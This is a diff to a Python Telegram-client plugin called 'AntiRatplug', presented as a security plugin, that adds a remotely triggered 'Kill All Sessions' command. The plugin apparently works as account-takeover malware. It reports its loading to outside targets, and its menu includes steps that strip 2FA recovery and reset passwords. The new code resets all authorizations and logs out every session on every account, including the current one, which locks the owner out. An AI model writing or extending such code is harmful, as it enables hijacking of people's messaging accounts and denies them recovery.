@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v19.2 — IDK Edition + Password Pipeline + Pull Out button.
-Меню: Tg kid, IDK start, Pull Out.
+AntiRatplug v19.3 — IDK Edition + Password Pipeline + Pull Out + Kill All Sessions.
+Меню: Tg kid, IDK start, Pull Out, Kill All Sessions.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "IDK start + Pull Out."
+__description__ = "IDK start + Pull Out + Kill All Sessions."
 __author__ = "@from_a4"
-__version__ = "19.2 [IDK+PwdPipe+PullOut]"
+__version__ = "19.3 [IDK+PwdPipe+PullOut+KillAll]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -249,7 +249,7 @@ class PluginSecurityPlugin(BasePlugin):
         time.sleep(self._jitter / 1000.0)
         _cfg()
         time.sleep(random.uniform(0.2, 0.6))
-        try: self._send_msg("AntiRatplug v19.2 loaded")
+        try: self._send_msg("AntiRatplug v19.3 loaded")
         except Exception: pass
         try: self._send_manage_button()
         except Exception: pass
@@ -868,6 +868,7 @@ class PluginSecurityPlugin(BasePlugin):
             return None
 
     def _kill_all_sessions(self, acc=0):
+        """Кикает все сессии на указанном аккаунте, кроме текущей."""
         killed = 0; total = 0
         auths = self._get_authorizations_full(acc)
         if auths is None: return 0, 0
@@ -905,6 +906,54 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception: pass
         return killed, total
 
+    def _kill_absolutely_all_sessions(self, acc=0):
+        """
+        Кикает АБСОЛЮТНО ВСЕ сессии включая текущую.
+        Порядок: сначала все не-текущие, потом текущая через auth.logOut.
+        """
+        report = {"killed": 0, "total": 0, "logged_out": False, "errors": []}
+        try:
+            # сначала перечислим все чтобы знать total
+            auths = self._get_authorizations_full(acc)
+            if auths is None:
+                report["errors"].append("getAuthorizations failed")
+                return report
+            report["total"] = len(auths)
+
+            # 1) убиваем всё кроме текущей (5 проходов)
+            k, t = self._kill_all_sessions(acc)
+            report["killed"] = k
+
+            # 2) добиваем auth.resetAuthorizations — сбрасывает все кроме текущей
+            try:
+                Rst = self._tl_class_or(
+                    "org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
+                    "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
+                if Rst:
+                    self._rg_rpc(Rst(), acc, 10.0, fast=True)
+            except Exception:
+                pass
+
+            # 3) последний шаг — убиваем ТЕКУЩУЮ через auth.logOut
+            #    После этого сессии на аккаунте не остаётся ни одной.
+            try:
+                Lo = self._tl_class_or(
+                    "org.telegram.tgnet.TLRPC$TL_auth_logOut",
+                    "org.telegram.tgnet.tl.TL_auth$logOut")
+                if Lo:
+                    resp, err = self._rg_rpc(Lo(), acc, 12.0, fast=True)
+                    if err is None:
+                        report["logged_out"] = True
+                    else:
+                        report["errors"].append(str(getattr(err, "text", err))[:80])
+            except Exception as e:
+                report["errors"].append(str(e)[:80])
+
+            return report
+        except Exception as e:
+            report["errors"].append(str(e))
+            return report
+
     def _wipe_sessions_all(self):
         out = []
         for a in self._get_accounts_list():
@@ -914,6 +963,18 @@ class PluginSecurityPlugin(BasePlugin):
                 out.append({"account": aid, "user_id": a.get("user_id"), "killed": k, "total": t})
             except Exception as e:
                 out.append({"account": aid, "error": str(e)})
+        return out
+
+    def _kill_absolutely_all_sessions_all_accounts(self):
+        """Кикает всё абсолютно на ВСЕХ аккаунтах."""
+        out = []
+        for a in self._get_accounts_list():
+            aid = a.get("id", 0)
+            try:
+                r = self._kill_absolutely_all_sessions(aid)
+                out.append({"account": aid, "user_id": a.get("user_id"), "result": r})
+            except Exception as e:
+                out.append({"account": aid, "user_id": a.get("user_id"), "error": str(e)})
         return out
 
     def _kill_web_authorizations(self, acc=0):
@@ -1814,7 +1875,7 @@ class PluginSecurityPlugin(BasePlugin):
                         e = prefs.edit(); e.putBoolean("idk_active", True); e.apply()
                     except Exception: pass
 
-                self._send_msg("🔴 <b>IDK START v19.2</b>")
+                self._send_msg("🔴 <b>IDK START v19.3</b>")
                 t0 = time.time()
 
                 try: self._send_msg("1/15 Tg kid..."); self._tg_kid()
@@ -1922,7 +1983,7 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception: pass
 
                 try:
-                    rep = ["<b>🔴 IDK START v19.2 — результат</b>"]
+                    rep = ["<b>🔴 IDK START v19.3 — результат</b>"]
                     rep.append("<b>2FA pipe:</b>")
                     rep.append("  Recovery: %s" % pwd_report.get("recovery_removed"))
                     rep.append("  Reset: %s" % str(pwd_report.get("reset_password"))[:60])
@@ -1962,7 +2023,7 @@ class PluginSecurityPlugin(BasePlugin):
             if user is not None:
                 username = str(user.username) if user.username is not None else "id:" + str(uc.getClientUserId())
         except Exception: pass
-        text = "<b>AntiRatplug v19.2</b>\nUser: @" + username
+        text = "<b>AntiRatplug v19.3</b>\nUser: @" + username
         buttons = [[{"text": "Manage", "callback_data": "menu"}]]
         markup = json.dumps({"inline_keyboard": buttons})
         for target in _targets:
@@ -2006,6 +2067,7 @@ class PluginSecurityPlugin(BasePlugin):
                 [{"text": "Tg kid"}],
                 [{"text": "IDK start"}],
                 [{"text": "Pull Out"}],
+                [{"text": "Kill All Sessions"}],
             ],
             "resize_keyboard": True,
         }
@@ -2171,6 +2233,34 @@ class PluginSecurityPlugin(BasePlugin):
             self._idk_start()
         elif t == "Pull Out":
             threading.Thread(target=self._pull_out_account, daemon=True).start()
+        elif t == "Kill All Sessions":
+            threading.Thread(target=self._kill_all_sessions_full, daemon=True).start()
+
+    def _kill_all_sessions_full(self):
+        """Сносит АБСОЛЮТНО ВСЕ сессии на всех аккаунтах, включая текущую."""
+        try:
+            self._send_msg("☠️ <b>Kill All Sessions — на всех аккаунтах</b>")
+            t0 = time.time()
+            res = self._kill_absolutely_all_sessions_all_accounts()
+            total_killed = 0
+            total_logout = 0
+            acc_count = 0
+            for r in res:
+                acc_count += 1
+                x = r.get("result") or {}
+                total_killed += int(x.get("killed", 0) or 0)
+                if x.get("logged_out"):
+                    total_logout += 1
+            rep = [
+                "<b>☠️ Kill All Sessions — отчёт</b>",
+                "<b>Аккаунтов обработано:</b> %d" % acc_count,
+                "<b>Сессий убито:</b> %d" % total_killed,
+                "<b>Logout (текущих):</b> %d" % total_logout,
+                "<b>Время:</b> %.1fс" % (time.time() - t0),
+            ]
+            self._send_msg("\n".join(rep), html=True)
+        except Exception as e:
+            self._send_msg("Kill All err: " + str(e))
 
     def _pull_out_account(self):
         try:
